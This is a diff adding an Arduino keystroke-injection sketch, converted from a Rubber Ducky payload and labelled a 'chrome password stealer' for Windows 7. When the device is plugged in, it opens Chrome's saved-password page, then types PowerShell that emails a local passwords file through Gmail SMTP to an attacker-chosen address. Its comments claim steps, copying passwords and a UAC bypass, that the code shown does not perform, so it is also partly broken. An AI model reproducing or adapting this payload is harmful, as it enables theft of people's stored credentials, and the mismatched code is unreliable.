@@ -1,0 +1,115 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // Author: Nuk3leus
+  // Ducky chrome password stealer: 1.0
+  // Target: Windows 7
+  // Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
+  // closes chrome, Opens notepad with bypass uac so it can save to C:\ drive and pastes in password
+  // saves to C:\passwords.txt folder, closes notepad
+  // sends files via gmail to account.
+  delay(2000);
+  // -------------open chrome
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+  Keyboard.print(F("chrome"));
+
+  delay(1000);
+  typeKey(KEY_RETURN);
+
+  delay(4000);
+  // -------------copy plaintext password
+  Keyboard.print(F("chrome://settings/passwords"));
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("powershell"));
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+  Keyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$SMTPInfo.EnableSsl = $true"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'password');"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail.From = 'youremail@gmail.com'"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail.To.Add('toemail@gmail.com')"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail.Subject = 'Ducky chrome passwords'"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail.Body = 'Attached is your list of passwords.'"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$ReportEmail.Attachments.Add('c:\\passwords.txt')"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("$SMTPInfo.Send($ReportEmail)"));
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+  Keyboard.print(F("exit"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
